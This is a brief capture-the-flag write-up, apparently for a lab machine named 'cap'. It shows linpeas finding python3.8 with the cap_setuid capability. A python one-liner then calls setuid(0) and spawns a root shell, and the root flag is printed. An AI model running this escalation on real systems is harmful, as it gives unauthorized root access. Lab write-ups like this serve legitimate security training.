# Enumeration-
Linpeas-

![[Pasted image 20210620060443.png]]

### Found python with Capabilities-
```bash
Files with capabilities:
/usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
/usr/bin/ping = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
```

### Checking the python binary-

```bash
nathan@cap:~$ ls -la /usr/bin/ | grep -i python3
lrwxrwxrwx  1 root   root          23 Jan 27 15:41 pdb3.8 -> ../lib/python3.8/pdb.py
lrwxrwxrwx  1 root   root          31 Mar 13  2020 py3versions -> ../share/python3/py3versions.py
lrwxrwxrwx  1 root   root           9 Mar 13  2020 python3 -> python3.8
lrwxrwxrwx  1 root   root          16 Mar 13  2020 python3-config -> python3.8-config
-rwxr-xr-x  1 root   root     5486384 Jan 27 15:41 python3.8
lrwxrwxrwx  1 root   root          33 Jan 27 15:41 python3.8-config -> x86_64-linux-gnu-python3.8-config
lrwxrwxrwx  1 root   root          33 Mar 13  2020 x86_64-linux-gnu-python3-config -> x86_64-linux-gnu-python3.8-config
-rwxr-xr-x  1 root   root        3240 Jan 27 15:41 x86_64-linux-gnu-python3.8-config
```

### `lrwxrwxrwx  1 root   root           9 Mar 13  2020 python3 -> python3.8`
It is owned by root :)

# Exploitation & Root.txt-

```bash
nathan@cap:~$ python3 -c 'import os; os.setuid(0); os.system("/bin/sh")'
# whoami
root
# id
uid=0(root) gid=1001(nathan) groups=1001(nathan)
# cd /root
# ls
root.txt  snap
# cat root*
4f55e5c84d741add4b8aa512defb20d9
```


PAWNED!!!